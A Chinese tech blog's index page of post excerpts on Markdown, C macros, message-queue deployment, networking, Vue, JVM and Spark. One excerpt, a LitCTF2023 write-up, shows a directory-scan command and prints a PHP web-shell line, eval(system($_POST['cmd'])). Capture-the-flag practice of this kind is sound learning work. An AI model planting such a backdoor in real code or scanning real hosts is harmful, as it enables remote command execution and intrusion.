		<a class="list__footer-readmore btn" href="/posts/e8cc19f9969e5f28f9159493ddc204a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ffc643e4bbbcaa771b99fb9cce1ca6bb/" rel="bookmark">
			Markdown怎么样实现表格的单元格合并
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 在上一篇记录PHP date()的函数详解中，有一部分关于$format格式化选项介绍，用到了表格的单元格合并部分功能，文章基本都是基于Markdown语法创建，但在合并单元格这一项时，突然不知道具体用什么语法实现了。
其实原生的Markdown语法是不支持单元格合并的，但好在Markdown自身完全兼容HTML语法，所以我们可以使用HTML的table语法来实现
原文地址：https://www.ngxcode.com/archives/557.html 代码示例 &lt;table&gt; &lt;tr style="background-color: #eff3f5;"&gt; &lt;th colspan="3" style="text-align:center"&gt;单元格合并&lt;/th&gt; &lt;/tr &gt; &lt;tr style="background-color: #f7f7f7;"&gt; &lt;td &gt;单元格&lt;/td&gt; &lt;td&gt;单元格&lt;/td&gt; &lt;td&gt;单元格&lt;/td&gt; &lt;/tr &gt; &lt;tr &gt; &lt;td&gt;单元格&lt;/td&gt; &lt;td rowspan="3"&gt;单元格合并行&lt;/td&gt; &lt;td rowspan="3"&gt;单元格合并行&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;单元格&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;单元格&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan="2"&gt;单元格合并&lt;/td&gt; &lt;td&gt;单元格&lt;/td&gt; &lt;td&gt;单元格&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;单元格&lt;/td&gt; &lt;td&gt;单元格&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;单元格&lt;/td&gt; &lt;td&gt;单元格&lt;/td&gt; &lt;td&gt;单元格&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; 实现效果 单元格合并单元格单元格单元格单元格单元格合并行单元格合并行单元格单元格单元格合并单元格单元格单元格单元格单元格单元格单元格 结语 以上就是Markdown实现单元格合并的具体方法，更多文章请关注本站其他内容，感谢！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/437ccba9503c38dd458f23bde734cf70/" rel="bookmark">
			条件编译#ifdef的妙用详解_透彻
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文主要介绍c语言中条件编译相关的预编译指令，包括 #define、#undef、#ifdef、#ifndef、#if、#elif、#else、#endif、defined。
#define 定义一个预处理宏
#undef 取消宏的定义
#if 编译预处理中的条件命令，相当于C语法中的if语句
#ifdef 判断某个宏是否被定义，若已定义，执行随后的语句
#ifndef 与#ifdef相反，判断某个宏是否未被定义
#elif 若#if, #ifdef, #ifndef或前面的#elif条件不满足，则执行#elif之后的语句，相当于C语法中的else-if
#else 与#if, #ifdef, #ifndef对应, 若这些条件不满足，则执行#else之后的语句，相当于C语法中的else
#endif #if, #ifdef, #ifndef这些条件命令的结束标志.
defined 与#if, #elif配合使用，判断某个宏是否被定义
二、条件编译 条件编译是根据实际定义宏（某类条件）进行代码静态编译的手段。可根据表达式的值或某个特定宏是否被定义来确定编译条件。
最常见的条件编译是防止重复包含头文件的宏，形式跟下面代码类似：
1 #ifndef ABCD_H 2 #define ABCD_H 3 4 // ... some declaration codes 5 6 #endif // #ifndef ABCD_H 在实现文件中通常有如下类似的定义：
1 #ifdef _DEBUG 2 3 // ... do some operations 4 5 #endif 6 7 #ifdef _WIN32 8 9 // .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/437ccba9503c38dd458f23bde734cf70/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa7faf920cb80c9494f0cd384617b217/" rel="bookmark">
			RocketMQ5.0部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考连接：https://www.jianshu.com/p/eb60fc126477
安装目录：/opt/app/ （自定义）
一、 获取rocketmq 下载链接
https://github.com/apache/rocketmq/releases/tag/rocketmq-all-5.0.0
二、解压tar包
cd /opt/app/ tar -zxvf rocketmq-rocketmq-all-5.0.0.tar.gz 三、安装maven插件
1、由于下载到的rocketmq是源码，需要对源码进行编译，编译使用maven，若linux没有安装，需做该操作（依然是在/opt/app/）
wget https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz tar -zxvf apache-maven-3.6.3-bin.tar.gz vim /opt/app/apache-maven-3.6.3/conf/setting.xml 新增maven镜像http://maven.aliyun.com/nexus/content/groups/public/，如下图
2、配置环境变量，编辑文件/etc/profile在最下面添加以下内容
MAVEN_HOME=/opt/app/apache-maven-3.6.3
export MAVEN_HOME
export PATH=/usr/local/mongodb/bin:${MAVEN_HOME}/bin:$PATH
3、验证 mvn -v 得到maven信息，则成功配置完成
四、编译rocketmq
在rocketmq目录下执行 mvn -Prelease-all -DskipTests clean install -U 如图
五、rocketmq 启动
/rocketmq-rocketmq-all-5.0.0/distribution/target/rocketmq-5.0.0 该目录就是编译后的rocketmq
启动前准备，否则都是坑
1、启动前需要修改broker.conf
在/opt/app/rocketmq5.0.0/distribution/target/rocketmq-5.0.0/rocketmq-5.0.0/conf/broker.conf添加brokerIP1=39.106.120.181（你的公网ip）
安全组需要开放10909和10911端口，其中10911是非VIP通道，10909是VIP通道。
2、修改bin/runbroker.sh 和 runserver.sh
因为文件中默认分配的内存太大，而系统实际内存却太小导致启动失败。解决办法就是修改runbroker.sh 和 runserver.sh里的内存配置，调小一些即可。
vim runserver.sh
vim runbroker.sh
1、启动命令
路径
[root@al-new-test rocketmq-5.0.0]# pwd /opt/app/rocketmq5.0.0/distribution/target/rocketmq-5.0.0/rocketmq-5.0.0 nohup sh bin/mqnamesrv -n 39.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa7faf920cb80c9494f0cd384617b217/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcb8045f4d2572cbdfe4bb1a871fc9e8/" rel="bookmark">
			HTTP 503错误是什么，HTTP 503错误的原因和解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HTTP 503错误是指服务器暂时无法处理客户端的请求，常常出现在服务器超负荷或维护期间。在这种情况下，服务器会向客户端返回一个503状态码，告诉客户端请求无法完成。
1.服务器超负荷
当服务器上的请求量超过其容量时，服务器就无法正确处理这些请求。这种情况可能是由于许多同时发生的请求、不充分的服务器资源或不良的脚本编码所致。解决此问题的最佳方法是增加服务器资源或减少服务器上的同时请求数。
2.服务器维护
维护期间，服务器会关闭请求处理器，因此不能响应客户端的请求。如果客户端发送请求时，服务器正在维护，则会生成503错误。解决此问题的方法是等待服务器完成维护或尽快将维护通知客户端。
3.网络故障
网络故障可能导致服务器无法处理客户端请求。这可能是由于被动服务器或由于路由错误或其他网络问题导致。在这种情况下，解决方法是确定并修复网络故障。
4.软件错误
如果服务器上的软件出现错误，这可能导致服务器无法处理请求。这种情况可能是由于bug、错误的配置或软件更新而导致的。解决此问题的方法是找到并修复错误。
5.闪存网页缓存问题
在某些情况下，客户端可能会使用缓存中的过时页面而不是从服务器获取最新内容。如此一来，已经过期的缓存可能与服务器上的新内容不匹配，从而导致客户端收到503错误。解决此问题的方法是清除缓存或刷新页面。
总而言之，HTTP503错误通常是由于服务器容量超负荷、维护、网络故障、软件错误或网页缓存问题而引起的。解决这些问题需要找到问题的根源，然后执行适当的解决办法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/861f08bca720470084d1f2fa723aa207/" rel="bookmark">
			OSI的参考模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OSI七层参考模型
本模型的主要思想：分层
优点:1.更利于标准化 2.降低层次之间的关联性—某一层协议的增加或者减少，尽量不要影响 其他层次。
相同层次之间的设备协议具体相同或者相似的作用，不同层次之间具有 明显的差异，每一层都在下层的基础上提供某种增值服务。
应用层——接收用户的数据，人机交互的接口，面向的应用程序
表示层——讲逻辑语言转为机器语言，翻译，加密
会话层——发现建立和维护和断开一次会话链接，针对传输的每一种数据建立一条虚连接
传输层——优化传输，端对端的传输。
作用：
作用 1.区分流量 2.定义数据传输方式 （可靠传输TCP、不可靠传输UDP）
通过端口号区分流量
常见端口号（&lt;256）：
21端口号：FTP 文件传输服务
22端口号：SSH 远程登录（安全性较高 加密认证）- TCP
23端口：Telnet 远程登录服务 TCP
25端口：SMTP 简单邮件传输服务
53端口：DNS 域名解析服务 TCP和UDP
80端口：HTTP 超文本传输协议 TCP
110端口：POP3 “邮局协议版本”使用的端口
443端口：HTTPS 加密的超文本传输协议 TCP
520端口：RIP UDP
65536 0-65535 0-1023知名端口号，著名端口号，1024-65535
网络层——IP地址与路由器的选择
数据链路层———介质访问控制层MAC，逻辑链路控制层LLC。
电信号和二进制之间的转换 MAC地址—物理地址
物理层——处理电信号
TCP/IP模型
TCP/IP协议簇
协议数据单元—PDU L1PDU L2PDU L3PDU … L7PDU
应用层的数据—数据报文
传输层—数据段
网络层—数据包
数据链路层—数据帧
物理层—比特流
封装和解封装
解封装—封装的逆过程，可以理解为就是还原数据的过程。
TCP/IP（协议）
应用层
http：80
https：443
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/861f08bca720470084d1f2fa723aa207/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/704b3393acaa356af677cec407a2e30f/" rel="bookmark">
			C# 视频播放器 采用迅雷Aplayer 绿色使用无需安装 支持VS2022
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引擎介绍 APlayer 媒体播放引擎是迅雷公司从 2009 年开始开发的通用音视频媒体文件播放内核。
迅雷看看播放器和迅雷影音就是使用 APlayer 作为播放内核。
本质上APlayer播放引擎是一个ActiveX控件，可以被本地其他外部程序嵌入调用，也可以直接被网页嵌入，类似于(Adobe Flash Player)。APlayer不包含界面，但另一个依赖于APlayer的ActiveX控件APlayerUI可以提供丰富的界面元素(播放控制条，Flash广告等)，APlayerUI 也被包含在 APlayerSDK 中。
官方地址：迅雷APlayer媒体播放引擎-首页
重点 本文章与目前网上的均不一致，请注意查看，完全可以做到绿色版。
本次开发使用的是APlayerCaller.dll插件 由原来的COM的方式改为用插件的方式。完美支持VS2022以上版本。
上部分代码 1.引入DLL
//创建视频窗口 [DllImportAttribute("APlayerCaller.dll", EntryPoint = "APlayer_Create", SetLastError = true)] public static extern int APlayer_Create ( int hParent, int x, int y, int nWidth, int nHeight, IntPtr OnMessage, IntPtr OnStateChanged, IntPtr OnOpenSuccess, IntPtr OnSeekCompleted, IntPtr OnBuffer, IntPtr OnVideoSizeChanged, IntPtr ondownloadcodec, IntPtr OnEvent ); //打开 指定 地址的视频 [DllImportAttribute("APlayerCaller.dll", EntryPoint = "APlayer_OpenW", CharSet = CharSet.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/704b3393acaa356af677cec407a2e30f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a67563de9471b76c2234bf29a632e28/" rel="bookmark">
			Python类的三大特征和特殊方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		类的三大特征就是：封装，继承，多态。
封装 最常用的解释就是，封装就是将数据和基于数据的操作封装在类中，隐藏内部的数据，对外只提供公共的访问接口。封装就是为了把一些变量和函数信息保存起来，不让外界调用。
私有属性 私有属性有两种，第一种名字前带一个下划线的是约定俗成的写法（外界可以调用，但不建议调用），第二种就是名字前面带两个下划线的属性（标准的私有属性，类外部不可以调用，但可以通过一些方法来实现调用）。
class Cat: def __init__(self,name，password): #可以用一个或两个下划线来标识私有属性 #一个下划线的属性标识外部不应该调用，但还是可以直接调用 self._name = name #两个下划线的属性是标准的私有属性，只有在当前类中可以调用，子类都不行，但也有办法调用 self.__password = password #返回标准私有属性到终端 def get__password(self): return self.__password #修改标准私有属性的值 def set__password(self,value): self.__password = value 继承 继承主要就是为了少写代码，父类中有的方法如果在子类中合适就不需要再写一遍了。
class Animal: def __init__(self,name,age): self.name = name self.age = age def get_name(self): return self.name def set_name(self,value): self.name = value #Dog类继承了Animal类 class Dog(Animal): def say(): print('wang wang wang......') #Cat类继承了Animal类 class Cat(Animal): def say(): print('miao miao miao......') dog = Dog('qiqi',12) dog.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9a67563de9471b76c2234bf29a632e28/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/460abcbdae6042edefee2526e78a6d15/" rel="bookmark">
			LitCTF2023
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		LitCTF2023 总结： 题目很基础，有些题一言难尽。还是太菜了，做题做少了。多多刷题！！
但是还有收获的，思路，xff的替代，sql 爆库 ，session伪造。
我flag呢？ 查看源码即可。
彩蛋，扫描得到路径即可。
ping function check_ip(){ let ip = document.getElementById('command').value; let re = /^(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)$/; ​ if(re.test(ip.trim())){ return true; } alert('敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦'); return false; } 真的太蠢了，这种禁用，没发现是前端校验的。直接抓包修改就好了。
为何是前端 ，从返回true 应该会知道的。
php是世界上最好的语言 发现解密加密点击上面的就行了，但是还有个RUN CODE 没用到。
试一下代码执行结果真能。
Follow me and hack me 备份文件还有好吃的，大概就是彩蛋，扫一下
python dirmap.py -i http://node1.anna.nssctf.cn:28975 -lcf &lt;?php // 第三个彩蛋！(看过头号玩家么？) // _R3ady_Pl4yer_000ne_ (3/?) ?&gt; vim yyds .index.php.swp
eval(system($_POST['cmd'])); echo "&lt;p&gt;Oh You got my password!&lt;/p&gt;"; if ($_POST['password'] === base64_encode($password)) { echo "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/460abcbdae6042edefee2526e78a6d15/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40248358cfd3d37c41a3340c3fa929f6/" rel="bookmark">
			Docker安装Activemq
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Docker安装activemq
拉取镜像
docker pull webcenter/activemq 检查磁盘挂载
df -h 创建挂载目录
mkdir /home/activemq mkdir /home/activemq/log ActiveMq启动
docker run --name='activemq' \ -itd \ -p 8161:8161 \ -p 61616:61616 \ -e ACTIVEMQ_ADMIN_LOGIN=admin \ -e ACTIVEMQ_ADMIN_PASSWORD=123456 \ --restart=always \ -v /home/activemq:/data/activemq \ -v /homeke/activemq/log:/var/log/activemq \ webcenter/activemq:latest 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acd07beac2d295400b53ddc18360680c/" rel="bookmark">
			大模型高效调参—PEFT库（ Parameter-Efficient Fine-Tuning）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 在面对特定的下游任务时，如果进行Full FineTuning（即对预训练模型中的所有参数都进行微调），太过低效；而如果采用固定预训练模型的某些层，只微调接近下游任务的那几层参数，又难以达到较好的效果。
PEFT（Parameter-Efficient Fine-Tuning）是一个用于在不微调所有模型参数的情况下，有效地将预先训练的语言模型（PLM）适应各种下游应用的库。PEFT方法只微调少量（额外）模型参数，显著降低了计算和存储成本，因为微调大规模PLM的成本高得令人望而却步。最近最先进的PEFT技术实现了与完全微调相当的性能。
大模型训练的微调方法，包括prompt tuning、prefix tuning、LoRA、p-tuning和AdaLoRA等。
Adapter Tuning 谷歌的研究人员首次在论文《Parameter-Efficient Transfer Learning for NLP》提出针对 BERT 的 PEFT 微调方式，拉开了 PEFT 研究的序幕。下图所示的 Adapter 结构，将其嵌入 Transformer 的结构里面，在训练时，固定住原来预训练模型的参数不变，只对新增的 Adapter 结构进行微调。
首先是一个 down-project 层将高维度特征映射到低维特征，然后过一个非线形层之后，再用一个 up-project 结构将低维特征映射回原来的高维特征；同时也设计了 skip-connection 结构，确保了在最差的情况下能够退化为 identity。
从实验结果来看，该方法能够在只额外对增加的 3.6% 参数规模（相比原来预训练模型的参数量）的情况下取得和 Full-finetuning 接近的效果（GLUE 指标在 0.4% 以内）。
Prefix Tuning 在输入 token 之前构造一段任务相关的 virtual tokens 作为 Prefix，然后训练的时候只更新 Prefix 部分的参数，而 Transformer 中的其他部分参数固定。，学习到的前缀指令文本向量可以挖掘大模型的潜力去引导模型完成特定任务。
Prefix Tuning 和构造 Prompt 类似，只是 Prompt 是人为构造的“显式”的提示，并且无法更新参数，而 Prefix 则是可以学习的“隐式”的提示。
同时，为了防止直接更新 Prefix 的参数导致训练不稳定的情况，在 Prefix 层前面加了 MLP 结构（相当于将 Prefix 分解为更小维度的 Input 与 MLP 的组合后输出的结果），训练完成后，只保留 Prefix 的参数。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/acd07beac2d295400b53ddc18360680c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b88500383296735d3a93d21d08fc27e1/" rel="bookmark">
			RK3568的HDMI分辨率传递流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、packages/apps/Settings/src/com/android/settings/display/DrmDisplaySetting.java
public static void updateDisplayModesInfo(DisplayInfo displayInfo) { RkDisplayOutputManager manager = new RkDisplayOutputManager(); String[] orginModes = manager.getModeList(display, type); orginModes = filterOrginModes(orginModes); } //返回分辨率数组 private static String[] filterOrginModes(String[] modes) { for (int i = 0; i &lt; modes.length; ++i) { filterModeList.add(modes[i]); } return filterModeList.toArray(new String[0]); } 这里用到了RkDisplayOutputManager 类，最终被应用程序调用的函数是 updateDisplayModesInfo()，用于更新分辨率
2、frameworks/base/core/java/android/os/RkDisplayOutputManager.java
public String[] getModeList(int display, int type) { String iface = typetoface(type); try { return mService.getModelist(display, iface); } catch (Exception e) { Log.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b88500383296735d3a93d21d08fc27e1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c1936683bf779e3b9e628760201d8d3/" rel="bookmark">
			Vue2中router-view的多层嵌套参数传递（无需定义props），无需定义参数名，属性值也可传递进儿子、孙子组件。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们使用&lt;router-view/&gt;组件进行子页面跳转时候，可以通过为其设置参数来使父组件的参数传递进子组件。如：
&lt;router-view :paramName="paramValue"/&gt; 但是当我们页面层级包括很多层，具体多少层也是动态的时，我们期望子组件、孙子组件、孙子的孙子组件 。。（然后依次很多孙子。。）也能获取到老祖的参数，且后续各种儿子孙子的组件中也可能会保函router-view，并且不设置参数，此时我们可以使用如下方法，仅在祖先定义参数处添加v-bind参数即可，代码如下：
// 祖先代码： &lt;router-view :paramName1="paramValue2"/&gt; // 其他儿子、孙子如果也有&lt;router-view&gt;的时候，如下传参： &lt;router-view v-bind="$attrs"/&gt; // 这样在儿子、或者各种孙子页面中，如果期望获取老祖中所定义的参数，可以通过如下： ... this.$attrs['paramName1']来获取到参数 ... 当然，在儿子或者各种孙子页面中，也可以定义props来绑定老祖中的参数，如：
props:['paramName1'] 这样也可以得到。
延伸扩展
当我们有多个祖先时，每个祖先传递的参数可能不同，儿子或者各种孙子根据不同条件获取不同祖先的参数时可以采用上述的方法。这样不需要在儿子或者各种孙子中的&lt;router-view&gt;绑定具体的参数名，只需要通过$attr将参数延展到后续的儿子或者参数即可。具体参数获取或者业务逻辑由最下层级的儿子或者孙子自行根据业务处理。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e23a7968a49d4bce1a2ba86acf32014/" rel="bookmark">
			Linux C&#43;&#43;代码打印堆栈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		webrtc中有一份打印堆栈的源码，依赖于 libunwind源码文件中包含了几个webrtc的基础库，用于日志打印、临界区控制、字符串处理。在集成使用中，可以依次分别替换为你自己的日志打印、std::mutex/pthread_mutex、std::stringstream/sprintf。经本人验证，可以交叉编译后在arm板上使用。 头文件
/* * Copyright 2019 The WebRTC project authors. All Rights Reserved. * * Use of this source code is governed by a BSD-style license * that can be found in the LICENSE file in the root of the source * tree. An additional intellectual property rights grant can be found * in the file PATENTS. All contributing project authors may * be found in the AUTHORS file in the root of the source tree.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e23a7968a49d4bce1a2ba86acf32014/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2aa39efdb8f6ce24d349ef67969875e8/" rel="bookmark">
			处理vue3&#43;vite报错：vite.defineConfig is not a function
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		执行命令：npm install @vitejs/plugin-vue -D config里面配置代码： import vue from '@vitejs/plugin-vue' export default defineConfig({ plugins: [vue()] }) 配置完，会报错：TypeError: vite.createFilter is not a function
原因：vite插件与vite版本不一致 1、升级vite版本执行命令：
npm install -D vite@^3 2、降低插件版本：
npm i @vitejs/plugin-vue@2.3.3 安装最新的vue cli npm install -g @vue/cli 或者
yarn global add @vue/cli
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65565ff071637605f4af669fff765d3c/" rel="bookmark">
			从零开始学习JVM（四）-运行时数据区中的堆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 概述 一个JVM实例只存在一个堆内存，堆是Java内存管理的核心区域,同时也是JVM管理的最大一块内存空间，在JVM启动的时候即被创建，其空间大小也就确定了，我们可以根据实际程序情况调节堆内存大小。
《Java虚拟机规范》规定，堆可以处于物理上不连续的内存空间中，但在逻辑上它应该被视为连续的。所有的线程共享Java堆，在这里还可以划分线程私有的缓冲区（Thread Local Allocation Buffer，简称TLAB）。
《Java虚拟机规范》中对Java堆的描述是：所有的对象实例以及数组都应当在运行时分配在堆上。数组和对象可能永远不会存储在栈上。因为栈帧中保存引用，这个引用指向对象或者数组在堆中的位置。堆是GC（Garbage Collectioni，垃圾收集器）执行垃圾回收的重点区域。在方法结束后，堆中的对象不会马上被移除，仅仅在垃圾收集的时候才会被移除。堆是GC（Garbage Collection，垃圾收集器）执行垃圾回收的重点区域。
官方文档：The Java® Virtual Machine
Specification
《Java虚拟机规范》中明确说明：“尽管所有的方法区在逻辑上是属于堆的一部分，但一些简单的实现可能不会选择去进行垃圾收集或者进行压缩。”
堆的内存细分，这里在内存逻辑上将方法区放到堆内存的范畴：
JDK1.7堆空间内部结构如图所示：
JDK1.8堆空间内部结构如图所示：
2. 堆内存大小的设置和OOM Java堆区用于存储Java对象实例，那么堆的大小在JVM启动时就已经设定好了，大家可以通过选项“-Xmx”和“-Xms”来进行设置。
“-Xms”用于表示堆区（年轻代+老年代）的起始内存，-X标志JVM的运行参数，ms是memory start，等价于-XX:InitialHeapSize“-Xmx”用于表示堆区的最大内存，等价于-XX:MaxHeapSize 一旦堆区中的内存大小超过“-Xmx”所指定的最大内存时，将会抛出OutOfMemoryError异常。开发中通常建议将-Xms和-Xmx两个参数配置相同的值，其目的是为了能够在Java垃圾回收清理完堆区后不需要重新分隔堆区的大小，从而提高性能。
默认情况下，初始内存大小：物理电脑内存大小/64；最大内存大小：物理电脑内存大小/4.
通过代码查看堆的初始内存大小和最大内存大小
public class HeapSpaceInitial { public static void main(String[] args) { //返回JVM中堆内存总量 long initialMemory = Runtime.getRuntime().totalMemory() / 1024 / 1024; //返回JVM试图使用的最大堆内存量 long maxMemory = Runtime.getRuntime().maxMemory() / 1024 / 1024; System.out.println("-Xms:" + initialMemory + "M"); System.out.println("-Xmx:" + maxMemory + "M"); System.out.println("系统内存大小为：" + initialMemory * 64 / 1024 + "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65565ff071637605f4af669fff765d3c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d01433a36200b9e1fb5a422008ca357e/" rel="bookmark">
			sortablejs插件在el-table中的运用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		sortablejs插件在el-table中的运用 概述需求
有一个Table表格，由于数据是根据自增的ID进行排序显示的，有时了调整顺序会在数据库中直接操作数据表，来达到调整数据顺序的目的，因为为了实现在页面实现较为简单的拖拽排序，因此展开讨论。
最后sortablejs插件可以满足需求并可以快捷的实现功能。
参看资料：
官网：http://www.sortablejs.com/
中文文档：https://www.itxst.com/sortablejs/neuinffi.html
1、安装sortablejs插件 首先引入依赖，并重启项目
npm install sortablejs --save 2、实现效果 首先看下实现的效果如下：
1、这是原来的顺序：[1, 2, 3, 4]
2、通过鼠标拖拉即可改变位置: [4, 3, 1, 2]
3、编写vue页面(文末有完整页面) 3.1、在需要编写排序的页面引入sortablejs依赖 import Sortable from 'sortablejs'; 3.2、编写el-table并定义ref=“tableRef” ，ref可以理解为id &lt;template&gt; &lt;div class="index"&gt; &lt;el-row&gt; &lt;el-col&gt; &lt;el-table :data="tableData" ref="tableRef" size="small" border stripe&gt; &lt;el-table-column align="center" label="模板ID" prop="id"&gt;&lt;/el-table-column&gt; &lt;el-table-column align="center" label="模板信息" prop="mc"&gt;&lt;/el-table-column&gt; &lt;/el-table&gt; &lt;/el-col&gt; &lt;/el-row&gt; &lt;el-row style="margin-top: 20px"&gt; &lt;el-col :offset="17" :span="6"&gt; &lt;el-button-group&gt; &lt;el-button size="small" type="primary" @click="save"&gt;保存&lt;/el-button&gt; &lt;/el-button-group&gt; &lt;/el-col&gt; &lt;/el-row&gt; &lt;/div&gt; &lt;/template&gt; 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d01433a36200b9e1fb5a422008ca357e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff179fd3fc966edb2434feac9da576f1/" rel="bookmark">
			spark 使用python语言操作（基于pycharm的安装使用）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文是关于如何使用pycharm下面执行spark相关操作，spark搭建的是单机模式。
1.安装单机模式的spark 1.1 下载spark
下载地址：https://archive.apache.org/dist/spark/
我选取的是spark-3.1.2-bin-hadoop3.2.tgz
1.2 上传压缩包
将下载好的spark压缩包通过xftp传输到hadoop102的/opt/module（集群节点）目录下面
直接拖到过去就行了
1.3 解压缩包
tar -zxvf spark压缩包 -C 解压路径 我使用的是 tar -zxvf spark-3.1.2-bin-hadoop3.2.tgz -C /opt/software/ 1.4 修改文件名
mv spark-3.1.2-bin-hadoop3.2/ spark
1.5 将spark添加到环境变量
输入命令：sudo vim /etc/profile.d/my_env.sh
上面添加环境变量的目录是我个人创建的，大家可根据自己的情况完成spark的添加到环境变量
1.6 刷新一下环境
source /etc/profile.d/my_env.sh
1.6 启动测试
进入到spark里面 cd /opt/software/spark
执行
bin/spark-shell 出现以上界面，至此spark的单机安装成功！
2.spark的交互式开发 2.1 交互式开发
交互式开发：通过指令进入交互终端，在命令行直接进行开发
2.2 spark的交互式开发
spark有很多方式可以进行交互式开发
在我们的bin目录下面
其中：
pyspark：支持使用python开发
spark-shell：支持使用scala和java开发
sark-sql：支持sql进行开发
sparR：支持R语言进行开发
注意：在本章中是使用的python语言进行开发
3.使用python对spark进行交互式开发 3.1 执行 pyspark
报错了，并且说没有python3
因为spark使用python进行交互式开发时，依赖的python版本是python3
3.2 安装python3
python3的安装可以借助anconada工具完成，anconada中自带了python3，同时Anconada还集成了各自python的科学计算库（pandas，numpy等），因此我们选用Anconada安装python3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ff179fd3fc966edb2434feac9da576f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7cd93de7301946ed6a21b85b86daaa29/" rel="bookmark">
			A星(A*、A Star)路径规划算法详解（附MATLAB代码）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先看看运行效果，分别有三种模式，代码运行前需要通过鼠标点击设置起点和终点。 第一种模式直接输出最短路径 第二种模式输出最短路径的生成过程 第三种模式输出最短路径的生成过程和详细探索的过程 代码获取 gitee链接：https://gitee.com/chenshao777/A_Star_Matlab (麻烦点个Star哦！感谢！） 一、A* 算法原理
二、A* 算法实现步骤
三、A* 算法MATLAB代码
某站上我也发了视频，不过之前的版本没有添加鼠标点击功能，这里不能粘贴某站的链接，会被视为打广告，某站搜索“晨少的bili”，即可在主页上看到 某站A*视频
